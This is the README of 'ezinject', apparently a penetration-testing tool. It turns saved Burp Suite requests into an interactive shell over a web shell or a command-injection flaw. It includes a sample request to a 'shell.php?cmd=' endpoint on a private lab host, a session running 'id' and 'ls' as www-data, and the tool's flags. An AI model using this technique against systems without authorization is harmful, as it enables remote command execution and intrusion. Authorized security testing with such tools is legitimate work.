# ezinject
Save requests from Burp Suite and interact with web shells or command injection on web applications the easy way.
Just replace command injection with &ltEZINJECT&gt or something of your choosing with the '-c' flag.

### Example
```
$ cat test.req
GET /shell.php?cmd=<EZINJECT> HTTP/1.1
Host: 192.168.56.6:9000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/4.0 (compatible; Mozilla/5.0 ; Linux i686)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US;q=0.9,en;q=0.8
Connection: close

$ python3 ezinject.py -r test.req -os linux -http
ez >  id                     
uid=33(www-data) gid=33(www-data) groups=33(www-data)

ez >  ls                     
index.html
index.nginx-debian.html
shell.php

ez >
```
### Command line flags
```
$ python3 ezinject.py -h
usage: ezinject.py [-h] [-v] [-http] -r REQUESTFILE -os OS [-c COMMAND]
                   [-p PATTERN] [-first]

Interact with web shells or command injection on web applications.

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose         Display server reponse headers
  -http                 Force connecting over HTTPS
  -r REQUESTFILE, --request REQUESTFILE
                        Burp Request file
  -os OS, --operating-system OS
                        Target operating system (Windows|Linux)
  -c COMMAND, --command COMMAND
                        Command to replace in the burp file, ensure this is
                        unique in the request (default: <EZINJECT>)
  -p PATTERN, --pattern PATTERN
                        Specify a pattern that is located either side of
                        command output to extract eg: --pattern ZZZ (this will
                        filter ZZZ<command output>ZZZ)
  -first                If command output is appended, this will print the
                        first occurence. (default: print the last occurence)
```

### Features
- Tab completion 
- (Ctrl-l or "clear" or "cls") clears the screen
- History
- Type "EzHelp" for Powercatch help commands (command not sent over the network)

### TODO
- Implement File Upload and Download functionality (Performed in segments via base64)
- Flag that will auto generate and filter string for command injection